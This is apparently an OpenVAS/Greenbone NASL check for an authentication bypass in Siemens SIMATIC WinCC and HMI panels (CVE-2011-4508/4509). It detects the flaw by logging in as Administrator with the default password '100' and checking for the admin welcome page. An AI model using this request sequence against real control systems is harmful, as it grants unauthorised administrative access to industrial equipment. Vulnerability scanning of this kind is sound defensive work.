if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103372" );
	script_bugtraq_id( 51177 );
	script_cve_id( "CVE-2011-4508", "CVE-2011-4509" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Multiple Siemens SIMATIC Products Authentication Bypass Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51177" );
	script_xref( name: "URL", value: "http://xs-sniper.com/blog/2011/12/20/the-siemens-simatic-remote-authentication-bypass-that-doesnt-exist/" );
	script_xref( name: "URL", value: "http://www.us-cert.gov/control_systems/pdf/ICSA-11-356-01.pdf" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-12-23 10:42:29 +0100 (Fri, 23 Dec 2011)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Multiple Siemens SIMATIC products are affected by vulnerabilities that
  allow attackers to bypass authentication." );
	script_tag( name: "impact", value: "An attacker can exploit these issues to bypass intended security
  restrictions and gain access to the affected application. Successfully
  exploiting these issues may lead to further attacks." );
	script_tag( name: "affected", value: "SIMATIC WinCC Flexible 2004 through 2008 SP2 SIMATIC WinCC V11,
  V11 SP1, and V11 SP2 SIMATIC HMI TP, OP, MP, Mobile, and Comfort Series Panels" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
port = http_get_port( default: 80 );
host = http_host_name( port: port );
for dir in make_list( "/",
	 "/www/" ) {
	url = NASLString( dir, "start.html" );
	buf = http_get_cache( item: url, port: port );
	if(!buf){
		continue;
	}
	if(ContainsString( tolower( buf ), "miniweb" )){
		req = NASLString( "POST ", dir, "FormLogin HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n", "Accept-Encoding: gzip, deflate\\r\\n", "DNT: 1\\r\\n", "Referer: http://", host, "/start.html\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: 58\\r\\n", "\\r\\n", "Login=Administrator&Redirection=%2Fstart.html&Password=100\\r\\n\\r\\n" );
		result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		if(ContainsString( result, "Auth Form Response" )){
			start = eregmatch( string: result, pattern: "url=([^\"]+)" );
			if(isnull( start[1] )){
				continue;
			}
			co = eregmatch( string: result, pattern: "Set-cookie: ([^,]+)" );
			if(isnull( co[1] )){
				continue;
			}
			cookie = co[1];
			url = NASLString( start[1] );
			req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ", cookie, " path=/\\r\\n", "\\r\\n" );
			buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
			if(!buf){
				continue;
			}
			if(ContainsString( buf, "You are logged in" ) && ContainsString( buf, "Welcome Administrator" )){
				security_message( port: port );
				exit( 0 );
			}
		}
	}
}
exit( 0 );

